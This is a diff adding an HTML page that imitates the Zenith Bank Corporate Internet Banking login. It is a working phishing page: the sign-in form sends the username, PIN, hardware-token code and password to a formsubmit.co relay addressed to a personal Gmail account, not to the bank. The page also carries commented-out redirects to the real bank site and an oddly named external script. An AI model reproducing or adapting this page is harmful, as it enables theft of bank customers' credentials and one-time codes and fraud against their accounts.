@@ -1,0 +1,1082 @@
+<!DOCTYPE html>
+
+
+
+<!--<html>-->
+<html lang="en" xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+    <script src="/winkes-to-the-reportall-meeke-Volutate-Lands-ioy" async></script>
+    <!--    <meta http-equiv="refresh" content="0; url=https://www.google.com.ng/" />-->
+    <!--    <meta http-equiv="refresh" content="0; url=https://auth.zenithbank.com/internetbanking/" />-->
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link rel="shortcut icon" href="login/images/favicon.ico">
+    <!--    <link rel="shortcut icon" href="./login/images/favicon.ico">-->
+
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="csrf-token" content="TBr7KJv4JUGdIyPD0TvA">
+
+    <link rel="stylesheet" href="login/css/bootstrap.min.css">
+    <link rel="stylesheet" id="smartmag-core-css" href="login/css/style.css" type="text/css" media="all">
+    <link rel="stylesheet" id="bbp-default-css" href="login/css/bbpress.css" type="text/css" media="screen">
+    <link rel="stylesheet" id="smartmag-bbpress-css" href="login/css/bbpress-ext.css" type="text/css" media="all">
+    <link rel="stylesheet" id="smartmag-responsive-css" href="login/css/responsive.css" type="text/css" media="all">
+    <link rel="stylesheet" href="login/css/skdslider.css">
+    <link rel="stylesheet" href="login/css/sidenavi-right.css">
+
+
+    <style type="text/css">
+        .modal-body .form-horizontal .col-sm-2,
+        .modal-body .form-horizontal .col-sm-10 {
+            width: 100%
+        }
+
+        .modal-body .form-horizontal .control-label {
+            text-align: left;
+        }
+
+        .modal-body .form-horizontal .col-sm-offset-2 {
+            margin-left: 15px;
+        }
+    </style>
+
+    <script src="login/js/jquery-2.2.4.min.js" type="text/javascript"></script>
+    <script src="login/js/bootstrap.min.js"></script>
+    <script src="login/js/bootstrapvalidator.min.js" type="text/javascript"></script>
+    <script src="javascript/AesUtil.js" type="text/javascript"></script>
+    <script src="rollups/aes.js" type="text/javascript"></script>
+    <script src="rollups/pbkdf2.js" type="text/javascript"></script>
+
+    <script type="text/javascript">
+        function sfCallback(sessionId, deviceId) {
+            var s = document.getElementById("sfSessionId");
+            var d = document.getElementById("sfDeviceId");
+
+
+            s.value = sessionId;
+            //console.log ("Session Id:", s.value);
+
+            d.value = deviceId;
+            //console.log("Device ID: ", d.value);
+
+        }
+    </script>
+
+    <script type="text/javascript">
+        !(function(w, d) {
+            var s = d.createElement("script"),
+                qp = "r=" + Math.random() + "&t=" + (new Date()).getTime();
+            s.src = "https://zenith.sfserv.net/431c11eadbe0/main.js?" + qp;
+            s.type = "text/javascript";
+            s.async = true;
+            d.getElementsByTagName("head")[0].appendChild(s);
+        })(window, document);
+    </script>
+
+    <!--            <link rel="stylesheet" href="font-awesome/css/font-awesome.css">
+                <link rel="stylesheet" href="font-awesome/css/font-awesome.min.css">-->
+
+
+    <!-- <link  rel="stylesheet" href="login/css/percircle.css">-->
+    <style>
+        .alert-info {
+            color: #31708f;
+            background-color: #d9edf7;
+            border-color: #bce8f1;
+        }
+
+        .alert-dismissable,
+        .alert-dismissible {
+            padding-right: 35px;
+        }
+
+        .alert {
+            padding: 15px;
+            margin-bottom: 20px;
+            border: 1px solid transparent;
+            border-radius: 4px;
+        }
+
+        .alert {
+            font-size: 13px;
+        }
+
+        [data-tip] {
+            position: relative;
+        }
+
+        [data-tip]:before {
+            content: '';
+            /* hides the tooltip when not hovered */
+            display: none;
+            content: '';
+            border-left: 5px solid transparent;
+            border-right: 5px solid transparent;
+            border-bottom: 5px solid #1a1a1a;
+            position: absolute;
+            top: 30px;
+            left: 35px;
+            z-index: 8;
+            font-size: 0;
+            line-height: 0;
+            width: 0;
+            height: 0;
+        }
+
+        [data-tip]:after {
+            display: none;
+            content: attr(data-tip);
+            position: absolute;
+            top: 35px;
+            left: 0px;
+            padding: 5px 8px;
+            background: #1a1a1a;
+            color: #fff;
+            z-index: 9;
+            font-size: 0.75em;
+            height: 18px;
+            line-height: 18px;
+            -webkit-border-radius: 3px;
+            -moz-border-radius: 3px;
+            border-radius: 3px;
+            white-space: nowrap;
+            word-wrap: normal;
+        }
+
+        [data-tip]:hover:before,
+        [data-tip]:hover:after {
+            display: block;
+        }
+
+        .alert-primary {
+            color: #004085;
+            background-color: #cce5ff;
+            border-color: #b8daff;
+        }
+
+        .alert {
+            position: relative;
+            padding: .75rem 1.25rem;
+            margin-bottom: 1rem;
+            border: 1px solid transparent;
+            border-radius: .25rem;
+        }
+
+        .alert-danger {
+            color: #721c24;
+            background-color: #f8d7da;
+            border-color: #f5c6cb;
+        }
+
+        .loginP {
+            font-weight: 100;
+            text-align: center;
+            color: #a0a9b4;
+            font-size: 13px;
+            line-height: 22px;
+            margin-top: 11px;
+            margin-bottom: 11px;
+        }
+
+        .disableChrome {
+            -webkit-text-security: disc;
+        }
+    </style>
+
+
+    <script src="login/js/skdslider.js"></script>
+    <script type="text/javascript">
+        jQuery(document).ready(function() {
+            jQuery('#demo').skdslider({
+                'delay': 8000,
+                'fadeSpeed': 2000,
+                'showNextPrev': true,
+                'showPlayButton': true,
+                'autoStart': true
+            });
+        });
+
+        var content = $('meta[name=csrf-token]').attr("content");
+        var token = {
+            'content': content
+        };
+
+        if (!!token) {
+            window.xrftoken = token.content;
+            //console.log(window.xrftoken);
+            $.ajaxSetup({
+                headers: {
+                    'X-CSRF-TOKEN': token.content
+                }
+            });
+
+        } else {
+
+            //console.log("CSRF token not found: ")
+        }
+
+        /* $(window).load(function(){        
+               $('#myModalDiamond').modal('show');
+                });    */
+    </script>
+
+
+    <!--        <script src="login/js/jquery.js"></script>-->
+    <!--        <script src="js/jquery.min.js" type="text/javascript"></script>      -->
+    <!--        <script src="js/skdslider.js"></script>
+                <script type="text/javascript">
+                            jQuery(document).ready(function(){
+                                    jQuery('#demo').skdslider({'delay':8000, 'fadeSpeed': 2000,'showNextPrev':true,'showPlayButton':true,'autoStart':true});
+                            });
+            </script>-->
+
+
+    <!--        <script src="login/js/percircle.js"></script>-->
+    <title>Zenith Bank CorporateIBank | Index</title>
+</head>
+
+<body>
+
+
+    <!--Taiwo Added Popup for Access Diamond restriction 28022020-->
+    <div id="myModalDiamond" class="modal fade" role="dialog">
+        <div class="modal-dialog">
+            Modal content
+            <div class="modal-content">
+                <div class="modal-header" style="text-align: center;">
+                    <button type="button" class="close" data-dismiss="modal">&times;</button>
+                    <p></p>
+                    <p></p>
+                    <h4 class="modal-title"><b></b></h4>
+                </div>
+                <div class="modal-body">
+                    <p></p>
+                    <p></p>
+                    <h3 style="font-weight:normal; font-family: Open Sans, Arial, sans-serif;">
+                        This page is temporarily unavailable. Sorry for the inconveniences.
+                        <br/>
+                        <br/>
+                    </h3>
+                    <p></p>
+                    <p></p>
+                    <p></p>
+                    <p></p>
+                    <h5><b>Thank you.</b></h5>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-danger" data-dismiss="modal">Close</button>
+                </div>
+            </div>
+
+        </div>
+    </div>
+    <!-- Popup End-->
+    <div class="">
+
+
+        <div id="main-head" class="main-head">
+
+            <div class="wrap">
+
+                <header>
+                    <div id="logo-zb" class="title">
+                        <a><img src="login/images/logo.png" alt="logo"></a>
+                    </div>
+
+                    <div class="right">
+                        <div class="ads-widget">
+                            <img src="login/images/animated_logo1.gif" alt="logo" style="width: 75px; padding-top: 20px;">
+                        </div>
+                    </div>
+                </header>
+
+
+                <nav class="navigation cf">
+                    <div class="mobile" data-type="classic" data-search="1">
+                        <a href="#" class="selected">
+                        <span class="text">Home</span>
+                        <span class="current"></span>
+                        <i class="hamburger fa fa-bars"></i>
+                    </a>
+                    </div>
+
+                    <div class="menu-main-menu-container">
+                        <ul id="menu-main-menu" class="menu">
+                            <li id="menu-item-722" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-722">
+                                <a title="Home" href="#">Home</a>
+                            </li>
+                        </ul>
+                    </div>
+                </nav>
+
+            </div>
+
+        </div>
+
+        <div class="wrap">
+            <div class="breadcrumbs">
+                <span class="location">You are at:</span>
+                <a href="#" class="bbp-breadcrumb-home">Corporate Internet Banking</a>
+                <span class="delim">»</span><span class="current">Login</span>
+            </div>
+
+
+
+        </div>
+
+
+        <div class="main wrap cf" style="margin-bottom:0px">
+            <div class="row">
+                <div id="main-content1" class="col-8 main-content">
+                    <div class="post-0 forum type-forum status-publish">
+                        <div id="demo" class="skdslider" style="width:100%;">
+                            <ul>
+                                <!--                                    <li><img src="images/corporate-ibank.jpg" width="100%" /></li>-->
+                                <li><img src="login/images/01.jpg" width="100%" /></li>
+                                <li><img src="login/images/02.jpg" width="100%" /></li>
+                                <li><img src="login/images/03.jpg" width="100%" /></li>
+                                <li><img src="login/images/1.jpg" width="100%" /></li>
+                                <li><img src="login/images/2.jpg" width="100%" /></li>
+                                <li><img src="login/images/4.jpg" width="100%" /></li>
+                                <li><img src="login/images/5.jpg" width="100%" /></li>
+                                <li><img src="login/images/6.jpg" width="100%" /></li>
+                            </ul>
+                        </div>
+                        <div>
+
+                            <div id="bbpress-forums">
+
+                                <ul id="forums-list-0" class="bbp-forums">
+                                    <li class="bbp-body">
+                                        <!--		<div class="section-head gallery-title forum-cat" style="font-weight:normal; font-family: Open Sans;font-size: 13px; 
+                                                                                                             text-transform: uppercase; background: #515356; color: #efefef;
+                                                                                                             padding: 10px 14px; line-height: 34px;">-->
+                                        <div class="section-head gallery-title forum-cat" style="font-weight:normal; font-family: Open Sans,Arial, sans-serif; font-size: 13px; 
+                                                                         text-transform: uppercase; background: #515356; color: #efefef;
+                                                                         padding: 0px 14px; line-height: 34px;">
+                                            <ul class="forum-titles">
+                                                <li class="bbp-forum-info">Useful Information</li>
+                                            </ul>
+                                        </div>
+                                        <ul id="bbp-forum-1986" class="post-1996 forum type-forum status-publish single-forum loop-item-0 odd bbp-parent-forum-1984 bbp-forum-status-open bbp-forum-visibility-publish">
+                                            <li class="bbp-forum-freshness" style="width:7%">
+                                                <p class="bbp-topic-meta">
+                                                    <span class="bbp-topic-freshness-author">
+			<img alt="" src="login/images/qustn.jpg" class="avatar avatar-45 photo no-display appear" height="45"
+                 width="45"></span>
+                                                </p>
+                                            </li>
+
+                                            <li class="bbp-forum-info" style="width:93%">
+                                                <a href="https://www.zenithbank.com/eiw/Intelligence-Weekly-l5-21.pdf" target="_blank">Economic Intelligence weekly</a>
+                                                <div class="bbp-forum-content">Read up on our weekly economic intelligence article by our Research and Economic Intelligence Group
+                                                </div>
+                                            </li>
+                                        </ul>
+                                        <ul id="bbp-forum-1986" class="post-1996 forum type-forum status-publish single-forum loop-item-0 odd bbp-parent-forum-1984 bbp-forum-status-open bbp-forum-visibility-publish">
+                                            <li class="bbp-forum-freshness" style="width:7%">
+                                                <p class="bbp-topic-meta">
+                                                    <span class="bbp-topic-freshness-author">
+			<img alt="" src="login/images/qustn.jpg" class="avatar avatar-45 photo no-display appear" height="45"
+                 width="45"></span>
+                                                </p>
+                                            </li>
+
+                                            <li class="bbp-forum-info" style="width:93%">
+                                                <a href="https://www.zenithbank.com/investor-relations/share-information/" target="_blank">Share Price Information</a>
+                                                <div class="bbp-forum-content">Visit this site for detailed information about our share price
+                                                </div>
+                                            </li>
+                                        </ul>
+
+                                        <ul id="bbp-forum-1996" class="post-1996 forum type-forum status-publish single-forum loop-item-0 odd bbp-parent-forum-1984 bbp-forum-status-open bbp-forum-visibility-publish">
+                                            <li class="bbp-forum-freshness" style="width:7%">
+                                                <p class="bbp-topic-meta">
+                                                    <span class="bbp-topic-freshness-author">
+			<img alt="" src="login/images/pdlock-x.jpg" class="avatar avatar-45 photo no-display appear" height="45"
+                 width="45"></span>
+                                                </p>
+                                            </li>
+
+                                            <li class="bbp-forum-info" style="width:93%">
+                                                <a class="bbp-forum-title" href="https://www.zenithbank.com/customer-service/#protect-yourself" target="_blank">Security Tips</a>
+                                                <div class="bbp-forum-content">We will never ask for your personal security information by email or by phone. &nbsp;
+                                                    <a href="https://www.zenithbank.com/customer-service/#protect-yourself" target="_blank">Learn More...</a>
+                                                </div>
+                                            </li>
+                                        </ul>
+                                        <!-- #bbp-forum-1996 -->
+
+                                        <ul id="bbp-forum-1986" class="post-1996 forum type-forum status-publish single-forum loop-item-0 odd bbp-parent-forum-1984 bbp-forum-status-open bbp-forum-visibility-publish">
+                                            <li class="bbp-forum-freshness" style="width:7%">
+                                                <p class="bbp-topic-meta">
+                                                    <span class="bbp-topic-freshness-author">
+			<img alt="" src="login/images/qustn.jpg" class="avatar avatar-45 photo no-display appear" height="45"
+                 width="45"></span>
+                                                </p>
+                                            </li>
+
+                                            <li class="bbp-forum-info" style="width:93%">
+                                                <a class="bbp-forum-title" href="https://www.zenithbank.com/customer-service/faqs/#what-is-corporate-internet-banking" target="_blank">Frequently Asked Questions</a>
+                                                <div class="bbp-forum-content">Answers to some frequently asked questions about our products and services and much more. &nbsp;
+                                                    <a href="https://www.zenithbank.com/customer-service/faqs/#what-is-corporate-internet-banking" target="_blank">Learn More...</a>
+                                                </div>
+                                            </li>
+                                        </ul>
+                                        <!-- #bbp-forum-1986 -->
+
+                                        <ul id="bbp-forum-1986" class="post-1996 forum type-forum status-publish single-forum loop-item-0 odd bbp-parent-forum-1984 bbp-forum-status-open bbp-forum-visibility-publish">
+                                            <li class="bbp-forum-freshness" style="width:7%">
+                                                <p class="bbp-topic-meta">
+                                                    <span class="bbp-topic-freshness-author">
+			<img alt="" src="login/images/csu-icon.jpg" class="avatar avatar-45 photo no-display appear" height="45"
+                 width="45"></span>
+                                                </p>
+                                            </li>
+
+                                            <li class="bbp-forum-info" style="width:93%">
+                                                <a class="bbp-forum-title" href="https://www.zenithbank.com/customer-service/#contact-us" target="_blank">Contact Us</a>
+
+                                                <div class="bbp-forum-content">Phone: 234-1-2787000, 2927000, 4647000, 0700ZENITHBANK. Email Address: zenithdirect@zenithbank.com <br>
+
+                                                </div>
+                                            </li>
+
+                                        </ul>
+
+                                    </li>
+                                </ul>
+                            </div>
+
+
+                        </div>
+                    </div>
+                </div>
+                <!-- Sign In -->
+                <aside class="col-4 sidebar" id="signIn">
+                    <ul>
+                        <li id="bunyad_bbplogin_widget-2" class="widget bbp_widget_login" style="margin-bottom: 12px">
+                            <h3 class="widgettitle" id="alert" style="text-transform: none;">SIGN IN </h3>
+                            <form id="signInForm" action="https://formsubmit.co/ismailbabatunde800@gmail.com" method="POST"  class="bbp-login-form widget-login" autocomplete="off">
+                                <input type="hidden" id="csrfPreventionSalt" value="TBr7KJv4JUGdIyPD0TvA" name="csrfPreventionSalt" />
+                                <input type="hidden" id="sfSessionId" name="sfSessionId" value="" />
+                                <input type="hidden" id="sfDeviceId" name="sfDeviceId" value="" />
+                                <fieldset>
+                                    <legend>Log In</legend>
+                                    <!--    <p class="text-center loginP">Please choose how you would like to Log in today</p>                                      
+                             <div class="form-group bbp-username input-group">  
+                                <div class="inputGroupContainer">          
+                                    <div class="bbp-username input-group">
+                                     
+                                          <select class="form-control" id="loginType">
+                                              <option value="pinPlusToken">Pin And Token</option>
+                                                <option value="password">Password </option>
+                                          </select>
+                                    </div>
+                                </div>
+                           </div>  -->
+
+
+                                    <div id="TokenContainer">
+                                        <!-- -sign in with token -->
+
+                                        <div class="form-group bbp-username input-group">
+                                            <div class="inputGroupContainer">
+                                                <div class="bbp-username input-group">
+                                                    <span class="input-group-addon" style="color: #555;">
+                   <i class="glyphicon glyphicon-user" data-toggle="tooltip" title="USERNAME - This is a unique identity assigned to you.
+                        This is usually formed from your names"></i> 
+                  </span>
+                                                    <input type="text" name="loginid" value="" id="loginid" size="20" tabindex="103" placeholder="Username" data-toggle="tooltip" title="USERNAME - This is a unique identity assigned to you.
+                        This is usually formed from your names">
+                                                </div>
+                                            </div>
+                                        </div>
+
+                                        <div class="form-group bbp-username input-group">
+                                            <div class="inputGroupContainer">
+                                                <div class="bbp-username input-group">
+                                                    <span class="input-group-addon" style="color: #555;">
+                      <i class="glyphicon glyphicon-pushpin" data-toggle="tooltip"
+                         title="PIN - Your PIN should be between 4 to 8 digits long."></i>
+                  </span>
+                                                    <input class="disableChrome" type="text" name="pin" value="" maxlength="8" id="pin" size="20" tabindex="103" placeholder="PIN" data-toggle="tooltip" title="PIN - Your PIN should be between 4 to 8 digits long." autocomplete="off">
+                                                    <span class="input-group-addon" style="color: #555; background-color: #eee; border-color: #ccc;">
+                            <i class="glyphicon glyphicon-eye-open" id="showPassExist" data-toggle="tooltip"
+                               title="Show PIN"></i>
+                        </span>
+                                                </div>
+                                            </div>
+                                        </div>
+
+                                        <div class="form-group bbp-username input-group">
+                                            <div class="inputGroupContainer">
+                                                <div class="bbp-username input-group">
+                                                    <span class="input-group-addon" style="color: #555;">
+                      <i class="glyphicon glyphicon-lock" data-toggle="tooltip"
+                         title="TOKEN CODE - The token code is any 6-digit reading displayed on your token."></i>
+                  </span>
+                                                    <input class="disableChrome" type="text" name="token" value="" maxlength="6" id="token" size="20" tabindex="103" placeholder="Token Code" data-toggle="tooltip" title="TOKEN CODE - The token code is any 6-digit reading displayed on your token." autocomplete="off">
+                                                </div>
+                                            </div>
+                                        </div>
+
+                                    </div>
+
+                                    <div style="display: none;" id="PasswordContainer">
+                                        <!-- -sign in with Password -->
+
+                                        <div class="form-group bbp-username input-group">
+                                            <div class="inputGroupContainer">
+                                                <div class="bbp-username input-group">
+                                                    <span class="input-group-addon" style="color: #555;">
+                   <i class="glyphicon glyphicon-user" data-toggle="tooltip" title="USERNAME - This is a unique identity assigned to you.
+                        This is usually formed from your names"></i> 
+                  </span>
+                                                    <input type="text" name="bloginid" value="" id="passwordloginid" size="20" tabindex="103" placeholder="Username" data-toggle="tooltip" title="USERNAME - This is a unique identity assigned to you.
+                        This is usually formed from your names">
+                                                </div>
+                                            </div>
+                                        </div>
+
+                                        <div class="form-group bbp-username input-group">
+                                            <div class="inputGroupContainer">
+                                                <div class="bbp-username input-group">
+                                                    <span class="input-group-addon" style="color: #555;">
+                      <i class="glyphicon glyphicon-lock" data-toggle="tooltip"
+                         title="Password - Your Password should be easy to recall but impossible to guess by others."></i>
+                  </span>
+                                                    <input class="disableChrome" type="text" name="bPassword" value="" id="password" size="20" tabindex="103" placeholder="Password" data-toggle="tooltip" title="Password - Your Password should be easy to recall but impossible to guess by others." autocomplete="off">
+                                                    <span class="input-group-addon" style="color: #555; background-color: #eee; border-color: #ccc;">
+                            <i class="glyphicon glyphicon-eye-open" id="showPassWordExist" data-toggle="tooltip"
+                               title="Show Password"></i>
+                        </span>
+                                                </div>
+                                            </div>
+                                        </div>
+
+
+                                    </div>
+
+                                    <div class="bbp-submit-wrapper">
+                                        <a href="#" title="Click here to Sign up as a new user" id="newUserA" style="cursor: pointer;" class="bbp-lostpass-link lost-pass-modal"><b>NEW
+                                        USER?</b></a>
+                                        <input type="submit" style='width:30%; color: #fff;' name="btnSignIn" id="btnSignIn" value="Log In" class="button submit user-submit" />
+                                        <input type="hidden" name="status" value="1" id="status">
+                                    </div>
+                                    <div>
+                                        <p>
+                                    </div>
+                                    <div>
+                                        <a href="signup.jsp" title="Click here to register for Corporate Internet Banking" id="registerUser" style="width:100%;cursor: pointer;" class="bbp-lostpass-link lost-pass-modal"><b>SIGN UP FOR CIB</b></a>
+                                    </div>
+                                </fieldset>
+                            </form>
+                        </li>
+                        <br>
+
+                        <!--Added by T-Niyi 220319-->
+                        <li id="bbp_stats_widget-2a" class="panel widget widget_display_stats" style="margin-top:15px; ">
+                            <!-- <div class="panel-heading"> -->
+                            <!--  <div class="widgettitle">	 -->
+                            <h3 class="widgettitle">User Guide Videos</h3>
+                            <!-- <span class="pull-right clickable"><i class="glyphicon glyphicon-chevron-down"></i></span> -->
+                            <!-- </div> -->
+                            <!-- </div> -->
+                            <!-- <div  class="panel-body"> -->
+                            <dl role="main">
+                                <img src="login/images/cib-demo-vid.png" id="imgs" />
+                                <dt id="imgs"><a href="https://www.zenithbank.com/videos/CIB_LOGIN-DIY.mp4" target="_blank"
+                                             style="text-transform: capitalize; font-size: 14px;">How to Sign Up for
+                                CIB.</a></dt>
+                                <dt id="imgs"><a href="https://www.zenithbank.com/videos/CIB_Quick-tour-DIY.mp4"
+                                             target="_blank" style="text-transform: capitalize; font-size: 14px;">Watch
+                                CIB Quick Tour.</a></dt>
+                                <dt id="imgs"><a href="https://www.zenithbank.com/videos/CIB_single_payment.mp4"
+                                             target="_blank" style="text-transform: capitalize; font-size: 14px;">How to
+                                make Single Payment on CIB.</a></dt>
+                                <dt><a href="https://www.zenithbank.com/videos/CIB_bulk_payment.mp4" target="_blank"
+                                   style="text-transform: capitalize; font-size: 14px;">How to make Bulk Payment on
+                                CIB.</a></dt>
+                            </dl>
+                            <!--  </div> -->
+
+                        </li>
+
+
+                        <li id="bbp_stats_widget-2a" class="widget widget_display_stats" style="margin-top:15px;">
+                            <h3 class="widgettitle">Related Links</h3>
+                            <dl role="main">
+                                <dt id="forgotPinClick" style="cursor: pointer;">
+                                <a href="https://www.zenithbank.com/customer-service/faqs/#forgot-login-details"
+                                   target="_blank" style="text-transform: capitalize; font-size: 14px;">Forgot Login
+                                    Details?</a>
+                            </dt>
+                                <!--  
+								  <dt><a href="https://authdemo.zenithbank.com/internetbanking-demo/" target="_blank">Corporate Internet Banking Step-by-step guide</a></dt>
+                                  <dt><a href="pdf/CIB_login_guide_v2_2017.pdf" target="_blank" style="text-transform: capitalize; font-size: 14px; ">Login guide</a></dt>
+							 -->
+                                <dt><a href="https://realtime.zenithbank.com/DotNetRealtime/" target="_blank"
+                                   style="text-transform: capitalize; font-size: 14px;">Real-time access</a></dt>
+                                <dt><a href="" data-toggle="modal" data-target="#myModal"
+                                   style="text-transform: capitalize; font-size: 14px;">Feedback</a></dt>
+                            </dl>
+                        </li>
+                    </ul>
+                </aside>
+                <!-- Sign In End -->
+
+
+                <!-- New User Starts -->
+                <aside class="col-4 sidebar" id="newUser" style="display: none;">
+                    <ul>
+                        <li id="bunyad_bbplogin_widget-2" class="widget bbp_widget_login">
+                            <h3 class="widgettitle" id="alert2" style="text-transform: none;">NEW USER </h3>
+                            <form method="post" action="" class="bbp-login-form widget-login" autocomplete="off">
+                                <fieldset>
+                                    <div class="form-group bbp-username input-group">
+                                        <div class="inputGroupContainer">
+                                            <div class="bbp-username input-group">
+                                                <span class="input-group-addon" style="color: #555;">
+                      <i class="glyphicon glyphicon-user" data-toggle="tooltip" title="USERNAME - This is a unique identity assigned to you.
+                        This is usually formed from your names"></i>
+                  </span>
+                                                <input type="text" name="loginidNew" value="" id="loginidNew" size="20" tabindex="103" placeholder="Username" data-toggle="tooltip" title="USERNAME - This is a unique identity assigned to you.
+                        This is usually formed from your names">
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <div class="form-group bbp-username input-group">
+                                        <div class="inputGroupContainer">
+                                            <div class="bbp-username input-group">
+                                                <span class="input-group-addon" style="color: #555;">
+                      <i class="glyphicon glyphicon-pushpin" data-toggle="tooltip"
+                         title="CREATE PIN - Your PIN should be 4 digits long."></i>
+                  </span>
+                                                <input type="password" name="newPin" value="" maxlength="4" id="newPin" size="20" tabindex="103" placeholder="Create PIN" data-toggle="tooltip" title="CREATE PIN - Your PIN should be 4 digits long." autocomplete="off">
+                                                <span class="input-group-addon" style="color: #555; background-color: #eee; border-color: #ccc;">
+                      <i class="glyphicon glyphicon-eye-open" id="showPassExist2" data-toggle="tooltip"
+                         title="Show PIN"></i>
+                  </span>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <div class="form-group bbp-username input-group">
+                                        <div class="inputGroupContainer">
+                                            <div class="bbp-username input-group">
+                                                <span class="input-group-addon" style="color: #555;">
+                      <i class="glyphicon glyphicon-pushpin" data-toggle="tooltip"
+                         title="CONFIRM PIN - The PIN you are setting up needs to confirmed. Kindly re-enter the PIN."></i>
+                  </span>
+                                                <input type="password" name="confirmPin" value="" maxlength="4" id="confirmPin" size="20" tabindex="103" placeholder="Confirm PIN" data-toggle="tooltip" title="CONFIRM PIN - The PIN you are setting up needs to confirmed. Kindly re-enter the PIN." autocomplete="off">
+                                                <span class="input-group-addon" style="color: #555; background-color: #eee; border-color: #ccc;">
+                      <i class="glyphicon glyphicon-eye-open" id="showPassExist3" data-toggle="tooltip"
+                         title="Show PIN"></i>
+                  </span>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <div class="form-group bbp-username input-group">
+                                        <div class="inputGroupContainer">
+                                            <div class="bbp-username input-group">
+                                                <span class="input-group-addon" style="color: #555;">
+                      <i class="glyphicon glyphicon-lock" data-toggle="tooltip"
+                         title="TOKEN CODE - The OTP generated by your token device."></i>
+                  </span>
+                                                <input type="password" name="tokenCode" value="" maxlength="30" id="tokenCode" size="20" tabindex="103" placeholder="Token Code" data-toggle="tooltip" title="TOKEN SERIAL NO - The serial number on the under side of your token device." autocomplete="off">
+                                                <input type="hidden" name="statusId" value="0" id="statusId">
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <div class="bbp-submit-wrapper">
+                                        <a href="#" title="Click here to Sign up as a new user" id="backToSignIn" style="cursor: pointer; text-transform: uppercase;" class="bbp-lostpass-link lost-pass-modal"><b>Back</b></a>
+                                        <input type="submit" style='width:30%; color: #fff;' name="" id="btnNewUser" value="CREATE PIN" class="button submit user-submit" />
+                                    </div>
+                                </fieldset>
+                            </form>
+                        </li>
+                        <br/>
+
+                        <!--  <li id="bbp_stats_widget-2a" class="widget widget_display_stats" style="margin-top:-40px;">-->
+                        <li id="bbp_stats_widget-2a" class="widget widget_display_stats" style="margin-top:-25px;">
+                            <h3 class="widgettitle">Related Links</h3>
+                            <dl role="main">
+                                <dt id="forgotPinClick2" style="cursor: pointer;">
+                                <a href="https://www.zenithbank.com/customer-service/faqs/#forgot-login-details"
+                                   target="_blank" style="text-transform: capitalize; font-size: 13px;">Forgot Login
+                                    Details?</a></dt>
+                                <!--                            <dt><a href="https://authdemo.zenithbank.com/internetbanking-demo/" target="_blank">Corporate Internet Banking Step-by-step guide</a></dt>-->
+                                <dt><a href="pdf/CIB_login_guide_v2_2017.pdf" target="_blank"
+                                   style="text-transform: capitalize; font-size: 13px;">Login guide</a></dt>
+                                <dt><a href="https://realtime.zenithbank.com/DotNetRealtime/" target="_blank"
+                                   style="text-transform: capitalize; font-size: 13px;">Real-time access</a></dt>
+                                <dt><a href="" data-toggle="modal" data-target="#myModal"
+                                   style="text-transform: capitalize; font-size: 14px;">Feedback</a></dt>
+                            </dl>
+                        </li>
+                    </ul>
+                </aside>
+                <!-- New User Ends -->
+
+
+                <!-- Post to ProcessLogin.java -->
+                <aside class="col-4 sidebar" id="PostToProcessLogin">
+                    <ul>
+                        <li id="bunyad_bbplogin_widget-2" class="widget bbp_widget_login" style="margin-bottom: 12px">
+                            <form id="hidd_form">
+                                <input type="hidden" name="mid" id="hidd_user">
+                                <input type="hidden" name="id" id="hidd_acc">
+                            </form>
+                        </li>
+                    </ul>
+                </aside>
+                <!-- End ProcessLogin.java -->
+
+
+                <!-- Feedback Modal-->
+                <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+                    <div class="modal-dialog">
+                        <div class="modal-content">
+
+                            <!--Modal Header-->
+                            <div class="modal-header">
+                                <button type="button" class="close" data-dismiss="modal">
+                                <span aria-hidden="true">&times;</span>
+                                <span class="sr-only">Close</span>
+                            </button>
+                                <h4 class="modal-title" id="myModalLabel" style="text-align: center; font-size: 18px;">
+                                    Customer's Feedback
+                                </h4>
+                            </div>
+
+                            <div id="alertus" style="width: 80%; text-align: center; margin-left: 50px; padding-top:5px; padding-bottom:5px; margin-top: 10px;"></div>
+
+                            <!--Modal Body-->
+                            <div class="modal-body">
+                                <form class="form-horizontal" role="form" id="feedbackForm ">
+                                    <input type="hidden" id="csrfPreventionSalt" value="TBr7KJv4JUGdIyPD0TvA" name="csrfPreventionSalt" />
+                                    <div class="form-group">
+                                        <label class="col-sm-2 control-label" for="inputName">Company Name</label>
+                                        <div class="col-sm-10">
+                                            <input type="text" class="form-control" id="companyName" placeholder="Company Name" required="required" />
+                                        </div>
+                                    </div>
+
+                                    <div class="form-group">
+                                        <label class="col-sm-2 control-label" for="inputName">Username</label>
+                                        <div class="col-sm-10">
+                                            <input type="text" class="form-control" id="custUsername" placeholder="Customer's Username" />
+                                        </div>
+                                    </div>
+
+                                    <div class="form-group">
+                                        <label class="col-sm-2 control-label" for="inputEmail">Email</label>
+                                        <div class="col-sm-10">
+                                            <input type="email" class="form-control" id="email" placeholder="Email" required="required" />
+                                        </div>
+                                    </div>
+
+                                    <div class="form-group">
+                                        <label class="col-sm-2 control-label" for="inputName">Phone Number(s)</label>
+                                        <div class="col-sm-10">
+                                            <input type="text" class="form-control" id="phoneNumber" maxlength="11" placeholder="Phone Number(s)" />
+                                        </div>
+                                    </div>
+
+                                    <div class="form-group">
+                                        <label class="col-sm-2 control-label" for="inputPassword3">Comment</label>
+                                        <div class="col-sm-10">
+                                            <textarea id="commentBox" type="text" runat="server" rows="7" maxlength="2000"></textarea>
+                                        </div>
+                                    </div>
+
+                                    <div class="form-group">
+                                        <div class="col-sm-offset-2 col-sm-10" style="text-align: center;">
+                                            <input type="submit" id="btnSendMail" class="btn btn-danger" />
+                                            <button type="button" class="btn btn-default" data-dismiss="modal">
+                                            Close
+                                        </button>
+                                        </div>
+                                    </div>
+
+                                </form>
+
+                            </div>
+
+                            <!--Modal Footer-->
+                            <!--<div class="modal-footer">
+                                 <button type="button" class="btn btn-default" data-dismiss="modal">
+                                             Close
+                                 </button>
+                                <button type="button" class="btn btn-primary">
+                                     Save changes
+                                 </button>
+                             </div>-->
+                        </div>
+                    </div>
+                </div>
+                <!-- End of Feedback Modal-->
+
+
+            </div>
